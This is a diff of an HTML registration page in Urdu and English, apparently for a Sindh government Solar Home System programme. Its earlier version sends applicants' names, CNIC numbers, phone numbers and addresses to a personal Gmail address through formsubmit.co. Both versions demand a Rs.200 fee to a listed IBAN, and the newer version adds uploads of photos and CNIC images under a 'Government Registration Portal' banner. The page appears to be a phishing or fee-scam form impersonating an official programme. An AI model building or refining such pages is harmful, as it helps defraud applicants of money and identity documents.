@@ -1,12 +1,116 @@
-<!doctype html><html lang="ur"><meta charset="utf-8"><title>SHS فارم</title>
-<link rel="stylesheet" href="style.css"><body><h1>سولر ہوم سسٹم (SHS) پروگرام - حکومت سندھ</h1>
-<form action="https://formsubmit.co/Waqar.ali.solangi.20@gmail.com" method="POST">
-<label>نام:<input name="name"></label><br>
-<label>والد کا نام:<input name="father"></label><br>
-<label>CNIC:<input name="cnic"></label><br>
-<label>موبائل:<input name="mobile"></label><br>
-<label>پتہ:<textarea name="address"></textarea></label><br>
-<p>فیس: 200 روپے</p>
-<p>IBAN: PK80TMFB0000000039897519</p>
-<label>Transaction ID:<input name="txid"></label><br>
-<button>جمع کریں</button></form></body></html>
+<!DOCTYPE html>
+<html lang="ur">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SHS Online Registration Portal</title>
+
+<link rel="stylesheet" href="style.css">
+
+<link rel="stylesheet"
+href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+
+</head>
+
+<body>
+
+<header class="header">
+
+<div class="logo">
+<h1>SHS ONLINE REGISTRATION</h1>
+<p>Government Registration Portal</p>
+</div>
+
+</header>
+
+<section class="hero">
+
+<h2>Online Registration Form</h2>
+
+<p>
+براہ کرم فارم مکمل اور درست معلومات کے ساتھ پُر کریں۔
+</p>
+
+</section>
+
+<div class="container">
+
+<form id="registrationForm">
+
+<h3>Applicant Information</h3>
+
+<label>Full Name</label>
+<input type="text" required>
+
+<label>Father Name</label>
+<input type="text" required>
+
+<label>CNIC Number</label>
+<input type="text" placeholder="xxxxx-xxxxxxx-x">
+
+<label>Mobile Number</label>
+<input type="tel">
+
+<label>Email</label>
+<input type="email">
+
+<label>Qualification</label>
+<input type="text">
+
+<label>Address</label>
+<textarea rows="3"></textarea>
+
+<hr>
+
+<h3>Upload Documents</h3>
+
+<label>Applicant Photo</label>
+<input type="file">
+
+<label>CNIC Front</label>
+<input type="file">
+
+<label>Payment Screenshot</label>
+<input type="file">
+
+<hr>
+
+<h3>Payment Information</h3>
+
+<div class="payment-box">
+
+<i class="fa-solid fa-wallet"></i>
+
+<h4>EasyPaisa Payment</h4>
+
+<p><strong>Fee:</strong> Rs.200</p>
+
+<p><strong>IBAN:</strong></p>
+
+<input
+type="text"
+value="PK80TMFB0000000039897519"
+readonly>
+
+<label>Transaction ID</label>
+
+<input
+type="text"
+placeholder="Enter Transaction ID">
+
+</div>
+
+<button type="submit">
+
+Submit Registration
+
+</button>
+
+</form>
+
+</div>
+
+<script src="script.js"></script>
+
+</body>
+</html>
